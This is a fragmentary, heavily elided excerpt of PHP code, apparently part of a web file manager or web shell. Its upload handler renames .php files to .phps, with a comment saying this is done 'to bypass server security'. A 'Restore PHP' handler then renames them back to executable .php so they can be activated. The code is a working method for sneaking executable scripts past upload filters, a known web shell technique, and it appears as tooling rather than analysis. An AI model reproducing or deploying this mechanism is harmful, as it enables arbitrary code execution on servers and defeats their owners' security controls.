...
if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] !== UPLOAD_ERR_NO_FILE) {
    if ($_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
        ...
        // Rename .php files to .phps to bypass server security
        ...
        if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
            ...
            if ($originalFileName !== $fileName) {
                $notification = 'File uploaded as: ' . $fileName . ' (use Restore PHP to activate)';
            } else {
...
if (isset($_POST['restore_php'])) {
    $fileName = $_POST['restore_php'];
    $sourcePath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fileName);
    
    if ($sourcePath === false || !is_file($sourcePath)) {
        $errorMsg = 'Restore failed: File not found';
    } elseif (preg_match('/\.php[0-9]?s$/i', $fileName)) {
        $newFileName = preg_replace('/s$/i', '', $fileName);
        $destinationPath = dirname($sourcePath) . DIRECTORY_SEPARATOR . $newFileName;
        
        if (file_exists($destinationPath)) {
            $errorMsg = 'Restore failed: File already exists with that name';
        } elseif (@rename($sourcePath, $destinationPath)) {
            $notification = 'PHP file restored: ' . $newFileName;
        } else {
            $errorMsg = 'Restore failed: Permission denied';
        }
    } else {
        $errorMsg = 'Restore failed: Not a valid .phps file';
    }
}
            ...
            <tr>
                ...
                <td>
                    ...
                    <?php else: ?>
                        ...
                        <?php if (preg_match('/\.php[0-9]?s$/i', $item)): ?>
                        <form method="post">
